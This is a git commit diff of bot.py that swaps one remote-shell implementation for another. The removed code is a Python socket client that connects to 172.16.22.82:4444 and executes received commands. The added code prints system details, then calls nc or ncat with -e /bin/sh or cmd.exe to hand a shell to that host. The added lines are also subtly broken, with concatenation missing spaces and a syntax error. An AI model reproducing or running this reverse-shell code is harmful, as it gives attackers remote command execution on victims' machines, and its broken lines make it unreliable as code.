30f44a0c2f676ad53bcf7b9d268221f707255491
Pol420OWO <118475266+Pol420OWO@users.noreply.github.com>
2023-02-14 20:38:14 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,16 +1,27 @@
-import socket
-import subprocess
-SERVER_HOST = "172.16.22.82"
-SERVER_PORT = 4444
-
-s = socket.socket()
-s.connect((SERVER_HOST, SERVER_PORT))
-message = s.recv(BUFFER_SIZE).decode()
-print("Server:", message)
-while True:
-  command = s.recv(BUFFER_SIZE).decode()
-    if command.lower() == "exit":
-      break
-  output = subprocess.getoutput(command)
-  s.send(output.encode())
-s.close()
+import platform
+import os
+import sysconfig
+import socket  
+def run():
+  hostname=socket.gethostname()   
+  IPAddr=socket.gethostbyname(hostname) 
+  iph='172.16.22.82'
+  lport='4444'
+  print('')
+  print(' ############### # # # ##############')
+  print(' ####### ###### # #  # # ####### ####')
+  print(' ######   ##### ##    ## ######   ###')
+  print(' ####### #######  #  #  ######## ####')
+  print(' ################ ### ###############')
+  print('')
+  print('# OS name: ', platform.system())
+  if "Linux" in platform.system():
+    print('Linux: ', sysconfig.get_platform()) 
+    print(' IpAddress: ', IPAddr)
+    #os.system( 'nc -lvp 4444 -e /bin/sh')
+    os.system('nc' + iph+ lport + ' -e /bin/sh')
+  elif "Windows" in platform.system():
+    print('Windows: ', sysconfig.get_platform()) 
+    print('Address ip: ', IPAddr)
+    #os.system('ncat -lvp 4444 -e cmd.exe')
+    os.system('ncat '+ iph + lport ' -e cmd.exe')
